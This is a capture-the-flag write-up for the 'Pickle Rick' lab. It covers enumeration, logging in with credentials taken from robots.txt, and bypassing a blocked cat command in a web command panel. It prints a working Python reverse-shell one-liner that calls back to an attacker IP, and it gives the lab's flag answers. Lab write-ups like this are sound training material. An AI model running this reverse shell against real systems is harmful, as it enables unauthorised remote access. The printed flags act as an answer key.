# Pickle Rick

# Enumeration

![image](https://github.com/it-crypto/WriteUp/assets/54020728/227782c9-56bc-4db1-b1e0-4ba56cf6f032)


![image](https://github.com/it-crypto/WriteUp/assets/54020728/78b583ce-aa8b-46ac-b1e0-64cd2bf362d6)

* Username : R1ckRul3s

![image](https://github.com/it-crypto/WriteUp/assets/54020728/24faed62-baad-4163-a8fd-b678ab56cfa1)

* From robots.txt found some text, so using the username and this text as password tried to login in to that page. Vola!! Logged
* Text from robots.txt url : Wubbalubbadubdub

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/d8fc9bd5-af97-4a3b-bebd-897c9c73b38a)

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/ce67e82a-1e95-43e6-96a2-aa05fd9f2fd9)

* Found a command line, trying to execute some commands and found they are giving values.

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/356c5da1-27e6-4254-839b-ccc371bdc942)

* Using cat command to view the contents, it showed error seems like cat command is disabled.

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/a7f16db1-cb46-427e-aab9-3490505f5f8f)

* So tried some other command to view the data.
* Command: grep . *
   
  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/0a668bff-069c-4d02-a305-f845269a5307)

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/64c234fb-5412-45c5-a97c-8bb37527be85)

* Got the first ingredient : mr. meeseek hair
* From the clue.txt they are mentioning that to view around file system to get another ingredient.
* Performing a directory traversal to find other files in the system

    ![image](https://github.com/it-crypto/WriteUp/assets/54020728/97ed26df-a3bf-4710-978a-8bf13989d4c2)

    ![image](https://github.com/it-crypto/WriteUp/assets/54020728/c5eee1b7-955e-45c1-9f48-88d4fadf121c)
* Tried directory reversal found user rick and there traversed again to find next ingredient
  
![image](https://github.com/it-crypto/WriteUp/assets/54020728/12bfb635-996e-47f2-ba4b-0651d87eaa00)
    
![image](https://github.com/it-crypto/WriteUp/assets/54020728/e61a013c-01ba-420d-8f0d-eec14262e8bf)

* Using rev shell
* Exploit:
  
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.1.103",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

* Used netcat for listening

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/931e99f3-bc69-4c96-82b1-b892a70ec32e)

* After getting the shell, checked the root folder and found the last ingredient.

  ![image](https://github.com/it-crypto/WriteUp/assets/54020728/2d29e397-d736-4312-8a6e-e674f31d0074)

 * Last ingredient : Fleeb juice 

  

  










